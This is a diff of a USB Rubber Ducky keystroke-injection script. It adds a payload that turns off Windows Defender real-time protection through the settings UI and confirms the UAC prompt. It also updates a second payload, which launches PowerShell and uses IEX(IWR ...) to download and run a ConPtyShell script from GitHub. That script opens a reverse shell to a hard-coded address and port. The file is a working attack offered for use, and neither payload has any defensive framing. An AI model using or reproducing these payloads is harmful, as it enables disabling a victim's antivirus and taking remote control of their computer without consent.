@@ -1,15 +1,45 @@
-REM Title:Reverse shell with poweshell
+REM Title:REM Title Reverse Powershell Ducky with disable :Windows 10 virus & threat protection
+REM Author Dark Storme
+REM Description:Disable :Windows 10 virus & threat protection
+REM Target: Windows 10
+DELAY 1000
+CONTROL ESCAPE
+DELAY 300
+STRING virus & threat protection
+DELAY 1000
+ENTER
+DELAY 1000
+TAB
+DELAY 50
+TAB
+DELAY 50
+TAB
+DELAY 50
+TAB
+DELAY 50
+ENTER
+DELAY 50
+SPACE
+DELAY 1000
+ALT y
+DELAY 1000
+TAB
+SPACE
+DELAY 1000
+ALT F4
+
+REM Title:Reverse shell with PowerShell
 REM Author:Dark Storme
 REM Description:Based on a Video by Network Chuck. I just made a Ducky version.
 REM Target:Windows
-DELAY 1000
+DELAY 10000
 GUI r
 DELAY 500
 STRING powershell.exe
 DELAY 500
 ENTER
 DELAY 1000
-STRING IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell  (IP) (port)
+STRING IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.1.82 888
 DELAY 500
 ENTER
 DELAY 500
